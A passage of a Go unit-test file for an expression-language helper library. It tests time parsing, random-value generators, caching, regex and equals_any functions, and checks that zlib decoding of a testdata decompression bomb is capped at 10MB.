			t.Run(dslExpression, func(t *testing.T) {
				actual := evaluateExpression(t, dslExpression)
				require.Equal(t, expectedTime.Unix(), actual)
			})
		}
	})

	t.Run("to_unix_time(input string, layout string) int", func(t *testing.T) {
		testScenarios := []struct {
			inputDateTime string
			layout        string
			expectedTime  time.Time
		}{
			{"2022-01-13T16:30:10+02:00", time.RFC3339, time.Date(2022, 01, 13, 16, 30, 10, 0, time.FixedZone("UTC+2", 2*60*60))},
			{"13-01-2022 16:30:10", "02-01-2006 15:04:05", time.Date(2022, 01, 13, 16, 30, 10, 0, time.UTC)},
			{"13-01-2022 16:30", "02-01-2006 15:04", time.Date(2022, 01, 13, 16, 30, 0, 0, time.UTC)},
			{"13-01-2022", "02-01-2006", time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC)},

			{"13-01-2022 16:30:10 +02:00", "02-01-2006 15:04:05 Z07:00", time.Date(2022, 01, 13, 16, 30, 10, 0, time.FixedZone("UTC+2", 2*60*60))},
			{"13-01-2022 16:30 +01:00", "02-01-2006 15:04 Z07:00", time.Date(2022, 01, 13, 16, 30, 0, 0, time.FixedZone("UTC+1", 60*60))},
			{"13-01-2022 -03:30", "02-01-2006 Z07:00", time.Date(2022, 01, 13, 0, 0, 0, 0, time.FixedZone("UTC-3:30", -3*60*60-30*60))},
		}

		for _, testScenario := range testScenarios {
			dslExpression := fmt.Sprintf(`to_unix_time("%s", "%s")`, testScenario.inputDateTime, testScenario.layout)
			t.Run(dslExpression, func(t *testing.T) {
				actual := evaluateExpression(t, dslExpression)
				require.Equal(t, testScenario.expectedTime.Unix(), actual)
			})
		}
	})
}

func TestRandDslExpressions(t *testing.T) {
	randDslExpressions := map[string]string{
		`rand_base(10, "")`:         `[a-zA-Z0-9]{10}`,
		`rand_base(5, "abc")`:       `[abc]{5}`,
		`rand_base(5)`:              `[a-zA-Z0-9]{5}`,
		`rand_char("abc")`:          `[abc]{1}`,
		`rand_char("")`:             `[a-zA-Z0-9]{1}`,
		`rand_char()`:               `[a-zA-Z0-9]{1}`,
		`rand_ip("192.168.0.0/24")`: `(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`,
		`rand_ip("2001:db8::/64")`:  `(?:[A-Fa-f0-9]{0,4}:){0,7}[A-Fa-f0-9]{0,4}$`,

		`rand_text_alpha(10, "abc")`:         `[^abc]{10}`,
		`rand_text_alpha(10, "")`:            `[a-zA-Z]{10}`,
		`rand_text_alpha(10)`:                `[a-zA-Z]{10}`,
		`rand_text_alphanumeric(10, "ab12")`: `[^ab12]{10}`,
		`rand_text_alphanumeric(5, "")`:      `[a-zA-Z0-9]{5}`,
		`rand_text_alphanumeric(10)`:         `[a-zA-Z0-9]{10}`,
		`rand_text_numeric(10, 123)`:         `[^123]{10}`,
		`rand_text_numeric(10)`:              `\d{10}`,
	}

	for randDslExpression, regexTester := range randDslExpressions {
		t.Run(randDslExpression, func(t *testing.T) {
			actualResult := evaluateExpression(t, randDslExpression)

			compiledTester := regexp.MustCompile(fmt.Sprintf("^%s$", regexTester))

			fmt.Printf("%s: \t %v\n", randDslExpression, actualResult)

			stringResult := toString(actualResult)

			require.True(t, compiledTester.MatchString(stringResult), "The result '%s' of '%s' expression does not match the expected regex: '%s'", actualResult, randDslExpression, regexTester)
		})
	}
}

func TestRandIntDslExpressions(t *testing.T) {
	randIntDslExpressions := map[string]func(int) bool{
		`rand_int(5, 9)`: func(i int) bool {
			return i >= 5 && i <= 9
		},
		`rand_int(9)`: func(i int) bool {
			return i >= 9
		},
		`rand_int()`: func(i int) bool {
			return i >= 0 && i <= math.MaxInt32
		},
	}

	for randIntDslExpression, tester := range randIntDslExpressions {
		t.Run(randIntDslExpression, func(t *testing.T) {
			actualResult := evaluateExpression(t, randIntDslExpression)

			actualIntResult := actualResult.(int)
			require.True(t, tester(actualIntResult), "The '%d' result of the '%s' expression, does not match th expected validation function.", actualIntResult, randIntDslExpression)
		})
	}
}

func TestCachingLayer(t *testing.T) {
	var (
		callCount      int
		expectedResult = "static value"
		cacheableFunc  = dslFunction{
			IsCacheable:  true,
			Name:         "cacheable_func",
			NumberOfArgs: 0,
			Signatures:   nil,
			ExpressionFunction: func(args ...interface{}) (interface{}, error) {
				time.Sleep(time.Second)
				callCount++
				return expectedResult, nil
			},
		}
	)

	for i := 0; i < 100; i++ {
		result := evaluateExpression(t, "cacheable_func()", cacheableFunc)
		require.Equal(t, expectedResult, result)
	}
	require.Equal(t, 1, callCount)
}

func evaluateExpression(t *testing.T, dslExpression string, functions ...dslFunction) interface{} {
	helperFunctions := maps.Clone(DefaultHelperFunctions)
	for _, function := range functions {
		helperFunctions[function.Name] = function.Exec
	}
	compiledExpression, err := govaluate.NewEvaluableExpressionWithFunctions(dslExpression, helperFunctions)
	require.NoError(t, err, "Error while compiling the %q expression", dslExpression)

	actualResult, err := compiledExpression.Evaluate(make(map[string]interface{}))
	require.NoError(t, err, "Error while evaluating the compiled %q expression", dslExpression)

	for _, negativeTestWord := range []string{"panic", "invalid", "error"} {
		require.NotContains(t, fmt.Sprintf("%v", actualResult), negativeTestWord)
	}

	return actualResult
}

func testDslExpressions(t *testing.T, dslExpressions map[string]interface{}) {
	for dslExpression, expectedResult := range dslExpressions {
		t.Run(dslExpression, func(t *testing.T) {
			actualResult := evaluateExpression(t, dslExpression)

			if expectedResult != nil {
				require.Equal(t, expectedResult, actualResult)
			}

			fmt.Printf("%s: \t %v\n", dslExpression, actualResult)
		})
	}
}

func Test_Zlib_decompression_bomb(t *testing.T) {
	compressedFile := "testdata/zlib_bomb.zlib"

	data, err := os.ReadFile(compressedFile)
	require.NoError(t, err)

	dslExpression := `zlib_decode(body)`

	helperFunctions := maps.Clone(DefaultHelperFunctions)
	for _, function := range functions {
		helperFunctions[function.Name] = function.Exec
	}
	compiledExpression, err := govaluate.NewEvaluableExpressionWithFunctions(dslExpression, helperFunctions)
	require.NoError(t, err, "Error while compiling the %q expression", dslExpression)

	actualResult, err := compiledExpression.Evaluate(map[string]interface{}{
		"body": string(data),
	})
	require.NoError(t, err, "Error while evaluating the compiled %q expression", dslExpression)
	// Cannot be greater than 10MB
	require.LessOrEqual(t, int64(len(actualResult.(string))), DefaultMaxDecompressionSize, "The result is too large")
}

func TestRegexFunctions(t *testing.T) {
	t.Run("regex", func(t *testing.T) {
		tests := map[string]interface{}{
			`regex("H([a-z]+)o", "Hello")`:                    true,
			`regex("\\d+", "abc")`:                            false,
			`regex("[a-z]+", "123")`:                          false,
			`regex("^\\d+$", "123abc")`:                       false,
			`regex("(?i)HELLO", "hello")`:                     true,
			`regex("^$", "")`:                                 true,
			`regex("\\s+", "nospaces")`:                       false,
			`regex("\\s+", "has some spaces")`:                true,
			`regex("^\\w+@\\w+\\.\\w+$", "test@example.com")`: true,
		}
		testDslExpressions(t, tests)
	})

	t.Run("regex_all", func(t *testing.T) {
		tests := map[string]interface{}{
			// Basic numeric tests
			`regex_all("\\d+", "123", "456", "789")`: true,
			`regex_all("\\d+", "123", "abc", "789")`: false,
			`regex_all("\\d+", "abc", "def", "ghi")`: false,

			// Pattern matching tests
			`regex_all("[a-z]+", "abc", "def", "ghi")`:    true,
			`regex_all("[A-Z]+", "ABC", "DEF", "GHI")`:    true,
			`regex_all("^[a-z]$", "a", "b", "c")`:         true,
			`regex_all("^\\w+$", "abc", "123", "abc123")`: true,

			// Edge cases
			`regex_all("^$", "", "", "")`:          true,
			`regex_all(".*", "", "abc", "123")`:    true,
			`regex_all("^\\s*$", " ", " ", " ")`:   true,
			`regex_all("^\\s+$", "   ", " ", "	")`: true,

			// Email pattern test
			`regex_all("^\\w+@\\w+\\.\\w+$", "test@test.com", "admin@test.com")`: true,
			`regex_all("^\\w+@\\w+\\.\\w+$", "test@test.com", "invalid")`:        false,

			// Case sensitivity tests
			`regex_all("(?i)test", "TEST", "Test", "test")`: true,
			`regex_all("test", "TEST", "Test", "test")`:     false,
		}
		testDslExpressions(t, tests)
	})

	t.Run("regex_any", func(t *testing.T) {
		tests := map[string]interface{}{
			// Basic numeric tests
			`regex_any("\\d+", "123", "abc", "789")`: true,
			`regex_any("\\d+", "abc", "def", "ghi")`: false,
			`regex_any("\\d+", "123", "456", "789")`: true,

			// Pattern matching tests
			`regex_any("[a-z]+", "ABC", "def", "GHI")`:    true,
			`regex_any("[A-Z]+", "abc", "def", "GHI")`:    true,
			`regex_any("^[a-z]$", "1", "b", "2")`:         true,
			`regex_any("^\\w+$", "!!!", "@#$", "abc123")`: true,

			// Edge cases
			`regex_any("^$", "a", "b", "")`:          true,
			`regex_any("^$", "a", "b", "c")`:         false,
			`regex_any("^\\s+$", "abc", " ", "def")`: true,

			// Email pattern test
			`regex_any("^\\w+@\\w+\\.\\w+$", "invalid", "test@test.com")`: true,
			`regex_any("^\\w+@\\w+\\.\\w+$", "invalid1", "invalid2")`:     false,

			// Case sensitivity tests
			`regex_any("(?i)test", "ABC", "Test", "xyz")`: true,
			`regex_any("test", "TEST", "TEST", "TEST")`:   false,
		}
		testDslExpressions(t, tests)
	})
}

func TestEqualAnyFunction(t *testing.T) {
	t.Run("equals_any", func(t *testing.T) {
		tests := map[string]interface{}{
			// Basic string matching tests
			`equals_any("test", "test", "foo", "bar")`: true,
			`equals_any("foo", "test", "bar", "baz")`:  false,
			`equals_any("hello", "hello", "world")`:    true,
			`equals_any("world", "hello", "world")`:    true,
			`equals_any("none", "hello", "world")`:     false,

			// Empty string tests
			`equals_any("", "", "test")`:     true,
			`equals_any("test", "", "test")`: true,
			`equals_any("", "test", "foo")`:  false,

			// Case sensitivity tests
			`equals_any("TEST", "test", "Test", "TEST")`: true,
			`equals_any("test", "TEST", "Test")`:         false,

			// Special characters tests
			`equals_any("test.com", "test.com", "test-com")`: true,
			`equals_any("test-com", "test.com", "test_com")`: false,
			`equals_any("test@123", "test@123", "test123")`:  true,

			// Numeric value tests (converted to string)
			`equals_any("123", "123", "456", "789")`: true,
			`equals_any("123", 123, "456", "789")`:   true,
			`equals_any(123, "123", "456", "789")`:   true,
			`equals_any("123", "456", "789")`:        false,
		}
		testDslExpressions(t, tests)
	})
}
